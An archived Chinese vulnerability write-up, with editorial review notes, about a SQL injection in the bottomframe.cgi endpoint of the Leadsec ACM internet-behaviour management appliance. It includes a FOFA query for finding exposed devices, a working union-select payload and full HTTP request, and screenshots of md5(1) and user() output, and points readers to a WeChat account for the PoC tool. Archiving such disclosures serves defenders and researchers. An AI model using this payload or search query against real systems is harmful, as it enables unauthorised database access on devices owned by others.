---
source: "MrWQ/vulnerability-paper"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "网御 ACM 上网行为管理系统 bottomframe.cgi 接口存在 SQL 注入漏洞 附 POC"
product: "网御Leadsec ACM"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "版本仅截图未结构化；md5/user SQL回显不等于取得全部数据库权限"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E7%BD%91%E5%BE%A1%20ACM%20%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20bottomframe.cgi%20%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20%E9%99%84%20POC.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa_unverified: "查询语句"
source_url: "https://mp.weixin.qq.com/s/Z5gPjqd5QlZaMc5DFT802A"
id: "vw-3b058ef0d92b9955a9dee757"
entity_id: "ve-3b058ef0d92b9955a9dee757"
schema_version: "1"
---

# 网御 ACM 上网行为管理系统 bottomframe.cgi 接口存在 SQL 注入漏洞 附 POC

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：网御Leadsec ACM
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：版本仅截图未结构化；md5/user SQL回显不等于取得全部数据库权限
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. FOFA误抓查询语句
2. 版本仅截图未结构化
3. md5/user SQL回显不等于取得全部数据库权限
4. 工具关注回复不算可用附件
5. 修复仅厂商主页缺公告/build
6. 保留bottomframe参数与原始来源

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/Z5gPjqd5QlZaMc5DFT802A>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Z5gPjqd5QlZaMc5DFT802A)

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

1. 网御 ACM 上网行为管理系统简介
--------------------

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

网御上网行为管理系统（简称 Leadsec ACM）是网御为互联网接入用户在信息内容安全、网络应用管理、组织运营效率、网络资源利用、法律风险规避及网络投资回报等方面提供的全方位解决方案。网御上网行为管理系统存在 SQL 注入漏洞。

2. 漏洞描述
-------

网御 ACM 上网行为管理系统 bottomframe.cgi 接口存在 SQL 注入漏洞，攻击者通过漏洞可以获取服务器数据库权限进行敏感操作。

CVE 编号:

CNNVD 编号:

CNVD 编号:

3. 影响版本
-------

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YgDkbRMQYSicSCKQHGmuWKkd50yPBL4EpMVEh135EPZkXiaic71NbhwUFicJw0pZhCXyVz3YoyiaEJWXA/640?wx_fmt=jpeg)

4.fofa 查询语句
-----------

app="网御星云 - 上网行为管理系统"

5. 漏洞复现
-------

漏洞链接：https://127.0.0.1/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23

漏洞数据包：

```
GET /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive


```

执行 md5(1) 函数 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YgDkbRMQYSicSCKQHGmuWKkibjtzMeZUX2icWc9r1xBnglJ1vicQHTg2kvtmBPvmDPpupkTZkiczwGrgQ/640?wx_fmt=jpeg)

执行 user() 函数 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YgDkbRMQYSicSCKQHGmuWKkz2wXABzQVdrjth9mE5YsEndtdCTx0XUE5cpVsQg533kh5SQAJbRdNA/640?wx_fmt=jpeg)

6.POC&EXP
---------

关注公众号  南风漏洞复现文库 并回复  漏洞复现 47  即可获得该 POC 工具下载地址： 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YgDkbRMQYSicSCKQHGmuWKkZ5hQMpnfMAMlN8ncE6fIwZs9qjEKzicr9oObMVEerop9YfcckRWsKvg/640?wx_fmt=jpeg)

7. 整改意见
-------

厂商已发布了漏洞修复程序，请及时关注更新：http://www.leadsec.com.cn/

8. 往期回顾
-------

[企业微信 cgi-bin/gateway/agentinfo 接口存在未授权访问漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484163&idx=1&sn=31584903c0571c952ad1e5c30ddf0659&chksm=974b8e04a03c07125d62ea9156c450998fdb8e30fd2bc3986ce63d16e251929751713ba9e1ae&scene=21#wechat_redirect)  

[万户协同办公平台 ezoffice 存在未授权访问漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484153&idx=1&sn=6ae72da323fdc98e0e6cb714d55b57a3&chksm=974b8ffea03c06e8ab6744d32c28a44080dac20c9b21a86b2d9a23c59530d09f100514a9eddb&scene=21#wechat_redirect)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
